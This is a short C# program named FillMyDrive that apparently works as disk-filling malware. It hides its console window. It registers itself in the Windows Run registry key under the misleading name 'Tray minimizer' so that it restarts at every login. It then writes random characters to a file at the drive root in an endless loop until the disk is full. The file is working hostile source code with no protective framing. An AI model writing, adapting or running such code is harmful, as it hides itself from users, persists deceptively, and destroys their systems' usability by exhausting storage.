using System;
using System.IO;
using System.Net.Mime;
using System.Text;
using Microsoft.Win32;
using System.Reflection;
using System.Runtime.InteropServices;

namespace FillMyDrive {
    class Program {

        [DllImport( "user32.dll" )]
        static extern bool ShowWindow( IntPtr hWnd, int nCmdShow );

        [DllImport( "Kernel32" )]
        private static extern IntPtr GetConsoleWindow();

        const int SW_HIDE=0;
        const int SW_SHOW=5;

        static void Main( string[] args ) {
            IntPtr hwnd;
            hwnd = GetConsoleWindow();
            ShowWindow( hwnd, SW_HIDE );

            startup( true );
            DirectoryInfo root;
            root = new DirectoryInfo( "/" );
            string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" +
                           "1234567890" +
                           "+*'!\\\"#¤%&/()=?§½@£$€{[]}-_.,:;<>\n\r\t";
            if(File.Exists( root + "file.fillMe" )) {
                using(FileStream fs = File.Open( root + "file.fillMe", FileMode.Append )) {
                    while(true) {
                        for(int i = 0; i < Environment.TickCount; i++) {
                            Random rnd = new Random();
                            Byte[] text = new UTF32Encoding( true, false ).GetBytes( Convert.ToString( chars.Substring( rnd.Next( 0, chars.Length ), 1 ) ) );
                            fs.Write( text, 0, text.Length );
                        }
                    }
                }
            }
            using(FileStream fs = File.Create( root + "file.fillMe" )) {
                while(true) {
                    for(int i = 0; i < Environment.TickCount; i++) {
                        Random rnd = new Random();
                        Byte[] text = new UTF32Encoding( true, false ).GetBytes( Convert.ToString( chars.Substring( rnd.Next( 0, chars.Length ), 1 ) ) );
                        fs.Write( text, 0, text.Length );
                    }
                }
            }
        }

        private static void startup( bool add ) {
            RegistryKey key = Registry.LocalMachine.OpenSubKey( @"Software\Microsoft\Windows\CurrentVersion\Run", true );
            if(add) {
                key.SetValue( "Tray minimizer", "\"" + Assembly.GetExecutingAssembly().Location + "\"" );
            } else {
                key.DeleteValue( "Tray minimizer" );
            }
            key.Close();
        }
    }
}
